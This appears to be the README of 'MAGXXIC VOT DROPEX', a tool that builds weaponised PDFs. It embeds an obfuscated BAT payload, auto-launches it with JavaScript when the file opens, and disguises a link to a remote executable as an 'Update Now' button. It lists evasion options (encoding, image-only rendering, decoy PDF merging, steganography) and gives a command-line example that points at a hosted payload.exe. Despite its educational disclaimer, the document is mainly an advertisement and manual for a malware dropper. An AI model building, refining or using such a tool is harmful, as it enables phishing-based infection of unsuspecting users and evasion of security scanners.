# MAGXXIC VOT DROPEX

Advanced HTML to PDF Delivery System - Stealth Edition.

## Features

- **HTML to PDF Conversion**: Uses Playwright for high-fidelity rendering.
- **Embedded Payloads**: Automatically embeds an obfuscated BAT file into the PDF.
- **Auto-Execution**: Includes JavaScript to automatically launch the embedded payload upon opening.
- **URI Fallback**: The "Update Now" button in the PDF is linked directly to the payload URL as a fallback if auto-execution fails.
- **Stealth Obfuscation**: Multiple methods to obfuscate the BAT script:
    - Base64 Obfuscation
    - Variable Obfuscation
    - PowerShell Encoded Wrapper
    - Hex Encoding
- **Advanced Evasion Options**:
    - **Image-Based Rendering**: Renders the HTML content as a full-page image inside the PDF to evade text-based scanners.
    - **Decoy Merge**: Merge your dropper with a legitimate decoy PDF.
    - **Steganography**: Hide the payload script within the branding image data.

## Setup

1. **Install Python Dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

2. **Install Playwright Browsers**:
   ```bash
   playwright install chromium
   ```

## Usage

Run the script interactively:
```bash
python magxxic_vot_dropex.py
```

Or provide arguments:
```bash
python magxxic_vot_dropex.py --payload_url "http://example.com/payload.exe" --html_template "template.html" --output_pdf "SecureUpdate.pdf" --crypt "Hex Encoding" --image_based
```

### Arguments

- `--payload_url`: The URL where your payload (exe) is hosted.
- `--html_template`: Path to the HTML file used as the PDF content. (Default: `template.html`)
- `--image_path`: Path to an optional image file to include as an extra page.
- `--output_pdf`: The name of the generated PDF file.
- `--crypt`: Obfuscation method for the BAT file (`None`, `Base64`, `Variable Obfuscation`, `PowerShell Encoded`, `Hex Encoding`).
- `--image_based`: Flag to render PDF content as an image.
- `--decoy_pdf`: Path to a decoy PDF to merge with.
- `--stego_image`: Path to an image to use for steganography.

## Template Customization

The HTML template should contain a placeholder `[[PAYLOAD_URL]]` where you want the link to the payload to be injected.

```html
<a href="[[PAYLOAD_URL]]" class="button">Update Now</a>
```

## Disclaimer

This tool is for educational and authorized security testing purposes only. The authors are not responsible for any misuse.
